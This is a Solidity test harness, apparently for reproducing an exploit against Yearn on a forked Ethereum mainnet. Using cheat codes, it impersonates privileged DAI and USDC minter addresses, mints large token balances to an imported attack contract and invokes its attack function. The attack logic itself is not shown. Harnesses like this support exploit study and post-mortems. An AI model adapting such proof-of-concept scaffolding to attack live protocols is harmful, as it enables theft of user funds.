// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;

import "ds-test/test.sol";
import "../attack.sol";
import "../stdlib.sol";
import "../Vm.sol";
import "../CheatCodes.sol";


contract attackTester is DSTest, stdCheats {
    Yearn_attack attackContract;
    Vm public constant vm = Vm(HEVM_ADDRESS);
    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);

    constructor() {
        startHoax(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58), 90000000000 ether);
        attackContract = new Yearn_attack();
        cheats.stopPrank();
        IDAI DAI = IDAI(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        startHoax(address(0x9759A6Ac90977b93B58547b4A71c78317f391A28));
        DAI.mint(address(attackContract), 130000000 * 10 ** 18 );
        cheats.stopPrank();    
        startHoax(address(0x55FE002aefF02F77364de339a1292923A15844B8));
        IUSDC USDC = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        address MasterMinter = USDC.masterMinter();
        cheats.stopPrank();
        startHoax(MasterMinter);
        USDC.configureMinter(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58), 2**256 -1);
        cheats.stopPrank();
        startHoax(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58));
        USDC.mint(address(attackContract), 134000000 * 10 ** 6);
    }
    
    function testExample0_() public {
      attackContract.attack();
    }


}